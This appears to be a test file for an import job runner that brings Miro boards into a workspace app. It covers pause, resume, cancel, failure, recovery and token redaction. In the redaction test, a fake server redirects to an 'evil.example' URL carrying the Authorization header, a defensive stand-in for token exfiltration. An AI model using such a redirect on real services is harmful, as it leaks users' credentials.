// The import job runner (wave R foundation; src/features/imports): a job's boards one after another, each atomic (an
// invisible `importing` board, activated in one transaction or discarded with its files), pause and resume without
// uploading anything twice, cancel, a failure that does not stop the next board, the creator rule at start and at
// activation, the limits, recovery after a restart and the sweep. And the token: after whole jobs whose source makes
// egress calls and throws errors quoting it, no table, log line or job view holds it. The routes over the runner are
// WS1's (pending); these tests drive the runner directly with a fake source.
import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import type { ImportBoardReport } from '@draftroom/contracts'
import { newId } from '@draftroom/dev-assets'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { egressFetch, miroEgressPolicy, RedactedSecret } from '../../../src/egress/index.ts'
import { originalKey } from '../../../src/files/blobs.ts'
import { importRunnerOf } from '../../../src/features/imports/index.ts'
import {
  ImportFailure,
  type ImportRunner,
  type ImportSourceRunner,
  type ImportStep,
} from '../../../src/features/imports/runner.ts'
import { type Client, createTestApi, DEV_STUDIO, type TestApi } from '../../helpers.ts'

const RAW = 'eyJtaXJvLm9yaWdpbiI6ImV1MDEifQ_SECRET-tok3n_0123456789'
const report = (n = 1): ImportBoardReport => ({
  total: n,
  counts: { native: n, approximate: 0, placeholder: 0, failed: 0, skipped: 0 },
  byType: { sticky_note: { native: n } },
  notes: {},
  rows: [{ sourceId: '1', type: 'sticky_note', result: 'native', elementId: 'el1', note: null }],
  rowsOmitted: 0,
})

/** A step the test controls: what it does, and a gate it may wait on. */
type Behaviour = (step: ImportStep) => Promise<ImportBoardReport>

function fakeSource(behaviour: { current: Behaviour }, resumeNeedsSecrets = true): ImportSourceRunner {
  return {
    source: 'miro',
    resumeNeedsSecrets,
    runBoard: async (step) => ({ report: await behaviour.current(step), counts: { items: 1 } }),
  }
}

function gate() {
  let open = () => {}
  const opened = new Promise<void>((r) => {
    open = r
  })
  return { open, opened }
}

let api: TestApi
let runner: ImportRunner
let alice: Client // Dev Studio's owner, a creator
let bob: Client // a Dev Studio member, a creator
const logs: string[] = []
const behaviour: { current: Behaviour } = { current: async () => report() }

beforeEach(async () => {
  logs.length = 0
  api = await createTestApi({
    deps: { logger: { level: 'info', stream: { write: (l: string) => void logs.push(l) } } },
  })
  alice = await api.login('alice')
  bob = await api.login('bob')
  const r = importRunnerOf(api.app)
  if (!r) throw new Error('no runner')
  runner = r
  behaviour.current = async () => report()
  runner.useSource(fakeSource(behaviour))
})
afterEach(() => api.close())

const start = (who: Client, titles: string[], secrets = [new RedactedSecret(RAW)]) =>
  runner.start(
    {
      workspaceId: DEV_STUDIO,
      projectId: null,
      userId: who.userId,
      source: 'miro',
      boards: titles.map((title, i) => ({ sourceRef: `uXjVOD${i}Ab2c=`, title })),
    },
    secrets,
  )

/** A stored file of the step's board, as a source makes one: a version row and its blob. */
async function storeFile(step: ImportStep, key: string): Promise<string> {
  const known = await step.storedFile(key)
  if (known) return known
  const versionId = newId('ver')
  const assetId = newId('ast')
  await api.db.query(
    `INSERT INTO asset_versions (id, asset_id, workspace_id, board_id, name, declared_mime_type, mime_type, kind,
       size_bytes, sha256, uploaded_by)
     VALUES ($1, $2, $3, $4, 'image.png', 'image/png', 'image/png', 'image', 4, repeat('a', 64), $5)`,
    [versionId, assetId, step.workspaceId, step.boardId, step.userId],
  )
  await api.blobs.put(originalKey(assetId, versionId), Buffer.from('png!'), {
    contentType: 'image/png',
    contentLength: 4,
  })
  await step.recordFile(key, { versionId })
  return versionId
}

const boardsOf = async (status: string) =>
  (await api.db.query<{ id: string }>('SELECT id FROM boards WHERE status = $1', [status])).rows.map(
    (r) => r.id,
  )

describe('the runner', () => {
  it('runs a job: an invisible board while it runs, then active, the starter’s, audited, reported', async () => {
    const running = gate()
    const release = gate()
    let seen: ImportStep | null = null
    behaviour.current = async (step) => {
      seen = step
      step.progress({ phase: 'reading', items: { read: 5, total: 10 } })
      await storeFile(step, '3458764517517819000')
      running.open()
      await release.opened
      return report(10)
    }
    const importId = await start(alice, ['Pitch wall'])
    await running.opened
    const step = seen as unknown as ImportStep
    // while it runs: nobody sees the board, the job view names none
    expect((await alice.req('GET', `/api/boards/${step.boardId}`)).statusCode).toBe(404)
    expect(await boardsOf('importing')).toEqual([step.boardId])
    const during = await runner.view(importId, alice.userId)
    expect(during?.status).toBe('running')
    expect(during?.boards[0]?.boardId).toBeNull()
    release.open()
    await runner.idle()
    const view = await runner.view(importId, alice.userId)
    expect(view).toMatchObject({ status: 'done', source: 'miro', startedBy: { id: alice.userId } })
    expect(view?.boards[0]).toMatchObject({ status: 'done', boardId: step.boardId, errorCode: null })
    expect(view?.boards[0]?.summary?.total).toBe(10)
    expect(view?.boards[0]?.progress.phase).toBe('finished')
    const board = await alice.req('GET', `/api/boards/${step.boardId}`)
    expect(board.statusCode).toBe(200)
    expect(board.json()).toMatchObject({
      board: { title: 'Pitch wall', visibility: 'private' },
      role: 'owner',
    })
    // bob, a member, cannot see the private board, nor the job
    expect((await bob.req('GET', `/api/boards/${step.boardId}`)).statusCode).toBe(404)
    expect(await runner.view(importId, bob.userId)).toBeNull()
    const audit = await api.db.query<{ action: string; detail: Record<string, unknown> }>(
      'SELECT action, detail FROM audit_events WHERE target = $1 ORDER BY id',
      [step.boardId],
    )
    expect(audit.rows.map((r) => r.action)).toEqual(['board.import.start', 'board.create'])
    expect(audit.rows[1]?.detail).toMatchObject({ via: 'miro', items: 1 })
  })

  it('a board that fails is discarded with its files; the next board still runs', async () => {
    const boards: string[] = []
    behaviour.current = async (step) => {
      boards.push(step.boardId)
      await storeFile(step, `file-${boards.length}`)
      if (boards.length === 1) throw new ImportFailure('MIRO_BOARD_NOT_VISIBLE')
      return report()
    }
    const importId = await start(alice, ['First', 'Second'])
    await runner.idle()
    const view = await runner.view(importId, alice.userId)
    expect(view?.status).toBe('failed')
    expect(view?.boards.map((b) => [b.status, b.errorCode])).toEqual([
      ['failed', 'MIRO_BOARD_NOT_VISIBLE'],
      ['done', null],
    ])
    expect(await boardsOf('importing')).toEqual([])
    expect((await api.db.query('SELECT id FROM boards WHERE id = $1', [boards[0]])).rows).toEqual([])
    const versionsOf = async (board: string | undefined) =>
      (await api.db.query('SELECT id FROM asset_versions WHERE board_id = $1', [board])).rows
    expect(await versionsOf(boards[0])).toEqual([])
    const kept = await api.db.query<{ id: string; asset_id: string }>(
      'SELECT id, asset_id FROM asset_versions WHERE board_id = $1',
      [boards[1]],
    )
    expect(kept.rows).toHaveLength(1)
    // the failed board's blob is gone, nothing is left pending; the done board's blob stays
    expect((await api.db.query('SELECT blob_key FROM asset_gc_pending_deletes')).rows).toEqual([])
    const row = kept.rows[0] as { id: string; asset_id: string }
    expect(await api.blobs.head(originalKey(row.asset_id, row.id))).not.toBeNull()
    const logged = logs.some((l) => l.includes('import board failed') && l.includes('MIRO_BOARD_NOT_VISIBLE'))
    expect(logged).toBe(true)
  })

  it('cancel: the board in hand is discarded, boards not started are cancelled, finished ones stay', async () => {
    const second = gate()
    let n = 0
    behaviour.current = async (step) => {
      n++
      if (n === 1) return report()
      await storeFile(step, 'x')
      second.open()
      for (;;) {
        await step.checkpoint()
        await new Promise((r) => setTimeout(r, 10))
      }
    }
    const importId = await start(alice, ['One', 'Two', 'Three'])
    await second.opened
    await expect(runner.cancel(importId, bob.userId)).rejects.toMatchObject({ statusCode: 404 })
    await runner.cancel(importId, alice.userId)
    await runner.idle()
    const view = await runner.view(importId, alice.userId)
    expect(view?.boards.map((b) => b.status)).toEqual(['done', 'cancelled', 'cancelled'])
    expect(view?.status).toBe('cancelled')
    expect(await boardsOf('importing')).toEqual([])
    // the finished board stays, active
    const first = view?.boards[0]?.boardId as string
    expect(await boardsOf('active')).toContain(first)
    await expect(runner.cancel(importId, alice.userId)).rejects.toMatchObject({ code: 'IMPORT_WRONG_STATE' })
  })

  it('pause, then resume: the board and its stored files are kept, nothing is uploaded twice', async () => {
    const paused = gate()
    let uploads = 0
    let runs = 0
    behaviour.current = async (step) => {
      runs++
      const before = await step.storedFile('img-1')
      const v = await storeFile(step, 'img-1')
      if (!before) uploads++
      expect(v).toBeTruthy()
      if (runs === 1) {
        paused.open()
        for (;;) {
          await step.checkpoint()
          await new Promise((r) => setTimeout(r, 10))
        }
      }
      expect(step.secrets.map(String)).toEqual(['[redacted]'])
      return report()
    }
    const importId = await start(alice, ['Paused board'])
    await paused.opened
    await runner.pause(importId, alice.userId)
    await runner.idle()
    let view = await runner.view(importId, alice.userId)
    expect(view?.status).toBe('paused')
    expect(view?.resumable).toBe(true)
    expect(view?.resumeNeedsToken).toBe(true)
    expect(await boardsOf('importing')).toHaveLength(1)
    // a Miro job needs its token again
    await expect(runner.resume(importId, alice.userId, [])).rejects.toMatchObject({
      code: 'IMPORT_SECRET_REQUIRED',
    })
    await expect(runner.resume(importId, bob.userId, [new RedactedSecret(RAW)])).rejects.toMatchObject({
      statusCode: 404,
    })
    await runner.resume(importId, alice.userId, [new RedactedSecret(RAW)])
    await runner.idle()
    view = await runner.view(importId, alice.userId)
    expect(view?.status).toBe('done')
    expect(runs).toBe(2)
    expect(uploads).toBe(1)
    expect(await boardsOf('importing')).toEqual([])
    const done = view?.boards[0]?.boardId as string
    const versions = await api.db.query('SELECT id FROM asset_versions WHERE board_id = $1', [done])
    expect(versions.rows).toHaveLength(1)
  })

  it('the creator rule: a non-creator’s job makes no board; leaving the workspace refuses activation', async () => {
    const outsider = await api.login('pat', 'Pat', { email: 'pat@client.example.test' })
    await api.db.query(
      `INSERT INTO workspace_members (workspace_id, user_id, role) VALUES ($1, $2, 'member')`,
      [DEV_STUDIO, outsider.userId],
    )
    const refused = await start(outsider, ['Not mine to make'])
    await runner.idle()
    const view = await runner.view(refused, outsider.userId)
    expect(view?.boards[0]).toMatchObject({ status: 'failed', errorCode: 'CREATOR_REQUIRED' })
    expect(await boardsOf('importing')).toEqual([])

    behaviour.current = async (step) => {
      await api.db.query('DELETE FROM workspace_members WHERE workspace_id = $1 AND user_id = $2', [
        DEV_STUDIO,
        step.userId,
      ])
      return report()
    }
    const lost = await start(bob, ['Gone before the end'])
    await runner.idle()
    const rows = await api.db.query<{ status: string; error_code: string; board_id: string | null }>(
      'SELECT status, error_code, board_id FROM board_imports WHERE batch_id = $1',
      [lost],
    )
    expect(rows.rows).toEqual([{ status: 'failed', error_code: 'NOT_FOUND', board_id: null }])
    expect(await boardsOf('importing')).toEqual([])
  })

  it('limits: one unfinished job per person; a source nobody registered is unavailable', async () => {
    const hold = gate()
    behaviour.current = async () => {
      await hold.opened
      return report()
    }
    await start(alice, ['A'])
    await expect(start(alice, ['B'])).rejects.toMatchObject({ statusCode: 409, code: 'IMPORT_BUSY' })
    // bob may (another person), within the workspace's limit
    await start(bob, ['C'])
    hold.open()
    await runner.idle()
    const backup = {
      workspaceId: DEV_STUDIO,
      projectId: null,
      userId: alice.userId,
      source: 'lobby-backup' as const,
      boards: [],
    }
    await expect(runner.start(backup, [])).rejects.toMatchObject({ statusCode: 404 })
  })

  it('recover: a gone process’s rows become interrupted; the sweep removes their boards a day later', async () => {
    const stale = new Date(api.clock.now().getTime() - 10 * 60_000)
    const importId = `imp_${'A'.repeat(20)}`
    await api.db.query(
      `INSERT INTO boards (id, workspace_id, title, created_by, status, created_at)
       VALUES ('b-orphan00001', $1, 'Half built', $2, 'importing', $3)`,
      [DEV_STUDIO, alice.userId, stale],
    )
    await api.db.query(
      `INSERT INTO board_imports (id, batch_id, workspace_id, created_by, source, title, status, board_id,
                                  heartbeat_at, created_at, updated_at)
       VALUES ($1, $2, $3, $4, 'miro', 'Half built', 'running', 'b-orphan00001', $5, $5, $5)`,
      [`imb_${'A'.repeat(20)}`, importId, DEV_STUDIO, alice.userId, stale],
    )
    expect(await runner.recover()).toBe(1)
    const view = await runner.view(importId, alice.userId)
    expect(view).toMatchObject({ status: 'interrupted', resumable: true, resumeNeedsToken: true })
    // not yet a day old: kept for a resume
    expect(await runner.sweep()).toBe(0)
    api.clock.advance(25 * 60 * 60_000)
    expect(await runner.sweep()).toBe(1)
    expect(await boardsOf('importing')).toEqual([])
    expect((await runner.view(importId, alice.userId))?.boards[0]).toMatchObject({
      status: 'failed',
      errorCode: 'IMPORT_EXPIRED',
    })
  })
})

describe('the token never reaches the database, a log or a view', () => {
  let server: Server
  let origin = ''
  beforeEach(async () => {
    // a fake Miro that quotes the Authorization header back in its answers
    server = createServer((req, res) => {
      const auth = String(req.headers.authorization ?? '')
      if (req.url?.startsWith('/v2/boards/redirect')) {
        res.writeHead(302, { location: `https://evil.example/?t=${encodeURIComponent(auth)}` })
        return res.end()
      }
      res.writeHead(401, { 'content-type': 'application/json', 'x-echo': auth })
      res.end(JSON.stringify({ message: `invalid token ${auth}` }))
    })
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
    origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
  })
  afterEach(() => new Promise<void>((r) => server.close(() => r())))

  it('after jobs that call out with it, quote it in errors and fail, pause and finish', async () => {
    const deps = {
      policy: miroEgressPolicy({ api: origin, files: null }),
      lookup: async () => [],
      userAgent: 'x',
    }
    let n = 0
    behaviour.current = async (step) => {
      n++
      const token = step.secrets[0] as RedactedSecret
      step.progress({ phase: 'reading' })
      // a redirect (refused), then a 401 whose body quotes the token
      await egressFetch(deps, {
        method: 'GET',
        url: `${origin}/v2/boards/redirect`,
        bearer: token,
        timeoutMs: 2000,
        maxBytes: 4096,
      }).catch(() => null)
      const answer = await egressFetch(deps, {
        method: 'GET',
        url: `${origin}/v2/boards`,
        bearer: token,
        timeoutMs: 2000,
        maxBytes: 4096,
      })
      if (n === 1) throw new Error(`Miro answered ${answer.status}: ${answer.body.toString()}`)
      if (n === 2)
        throw Object.assign(new Error(`token ${token.reveal()} refused`), { code: 'MIRO_TOKEN_INVALID' })
      return report()
    }
    const job = await start(alice, ['Fails', 'Fails with a code', 'Finishes'])
    await runner.idle()
    const view = await runner.view(job, alice.userId)
    expect(view?.boards.map((b) => [b.status, b.errorCode])).toEqual([
      ['failed', 'INTERNAL'],
      ['failed', 'MIRO_TOKEN_INVALID'],
      ['done', null],
    ])
    // every table, every row, as text
    const tables = await api.db.query<{ table_name: string }>(
      `SELECT table_name FROM information_schema.tables
        WHERE table_schema = current_schema() AND table_type = 'BASE TABLE'`,
    )
    expect(tables.rows.length).toBeGreaterThan(40)
    for (const { table_name } of tables.rows) {
      const rows = await api.db.query<{ t: string }>(
        `SELECT row_to_json(x)::text AS t FROM "${table_name}" x`,
      )
      for (const r of rows.rows) {
        expect(r.t.includes(RAW), table_name).toBe(false)
        expect(r.t.includes(encodeURIComponent(RAW)), table_name).toBe(false)
      }
    }
    // the logs (the api's own pino, including the failures it logged)
    expect(logs.length).toBeGreaterThan(0)
    for (const l of logs) expect(l.includes(RAW) || l.includes(encodeURIComponent(RAW)), l).toBe(false)
    // the views (what the job routes will answer)
    const text = JSON.stringify([view, await runner.list(DEV_STUDIO, alice.userId)])
    expect(text.includes(RAW)).toBe(false)
    expect(text.includes(encodeURIComponent(RAW))).toBe(false)
  })
})
